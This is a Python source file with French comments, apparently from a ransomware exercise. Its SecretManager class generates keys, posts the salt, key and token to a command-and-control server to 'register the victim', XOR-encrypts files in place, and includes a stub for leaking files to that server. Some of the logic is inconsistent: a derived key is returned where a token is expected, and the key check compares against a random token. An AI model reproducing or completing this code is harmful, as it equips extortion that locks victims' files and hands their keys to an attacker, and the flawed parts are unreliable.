from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hmac


from xorcrypt import xorfile
from pathlib import Path



class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None
        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        # Initialiser le KDF (Key Derivation Function) avec PBKDF2HMAC
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
            
        )
        # Dérive la clé en utilisant le sel et la clé initiale
        derived_key = kdf.derive(key)
        return derived_key

    def create(self) -> Tuple[bytes, bytes, bytes]:
         # Générer un sel et une clé aléatoires en utilisant token_bytes
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        # Générer un token aléatoire
        token = secrets.token_bytes(self.TOKEN_LENGTH)
        # Dérive la clé en utilisant do_derivation
        derived_key = self.do_derivation(salt, key)
        return salt, key, derived_key

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        # Préparer les données à envoyer au CNC
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        }

        # Envoyer les données au CNC en utilisant une requête POST
        response = requests.post(f'http://{self._remote_host_port}/new', json=data)

        # Vérifier si la réponse du CNC est un succès
        if response.status_code != 200 or response.json().get("status") != "OK":
            self._log.error("Failed to register the victim to the CNC")
            raise Exception("Failed to register the victim to the CNC")

    def setup(self) -> None:
        # Vérifier si un fichier token.bin existe déjà
        token_path = Path(self._path) / "token.bin"
        if token_path.exists():
            self._log.warning("A token file already exists, aborting setup")
            return

        # Créer les éléments cryptographiques (sel, clé et token)
        salt, key, token = self.create()

        # Sauvegarder les éléments cryptographiques localement
        with open(token_path, "wb") as token_file:
            token_file.write(token)

        salt_path = Path(self._path) / "salt.bin"
        with open(salt_path, "wb") as salt_file:
            salt_file.write(salt)

        # Envoyer les éléments cryptographiques au CN

    def load(self) -> None:
        # Charger le salt depuis le fichier salt.bin
        salt_path = os.path.join(self._path, "salt.bin")
        with open(salt_path, "rb") as f:
            self._salt = f.read()

        # Charger le token depuis le fichier token.bin
        token_path = os.path.join(self._path, "token.bin")
        with open(token_path, "rb") as f:
            self._token = f.read()

    def check_key(self, candidate_key: bytes) -> bool:
        h = hmac.HMAC(self._salt, hashes.SHA256())
        h.update(candidate_key)
        hmac_result = h.finalize()

        # Vérifiez que le HMAC du token correspond à celui calculé avec la clé candidate
        return hmac_result == self._token

    def set_key(self, b64_key: str) -> None:
        # Décoder la clé candidate en base64
        candidate_key = base64.b64decode(b64_key)

        # Vérifiez que la clé candidate est correcte
        if self.check_key(candidate_key):
            self._key = candidate_key
        else:
            raise ValueError("La clé fournie est incorrecte.")

    def get_hex_token(self) -> str:
        # Hacher le token avec SHA-256
        hashed_token = sha256(self._token).digest()

        # Convertir le token haché en représentation hexadécimale
        hex_token = hashed_token.hex()

        return hex_token
    
    def xorfiles(self, files: List[str]) -> None:
        # Chiffrer chaque fichier de la liste avec la clé self._key
        for file_path in files:
            try:
                xorfile(file_path, file_path, self._key)
                self._log.info(f"Encrypted file: {file_path}")
            except Exception as e:
                self._log.error(f"Error encrypting file {file_path}: {e}")

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # Supprimer le fichier token.bin
        token_path = os.path.join(self._path, "token.bin")
        if os.path.exists(token_path):
            os.remove(token_path)

        # Supprimer le fichier salt.bin
        salt_path = os.path.join(self._path, "salt.bin")
        if os.path.exists(salt_path):
            os.remove(salt_path)
    

    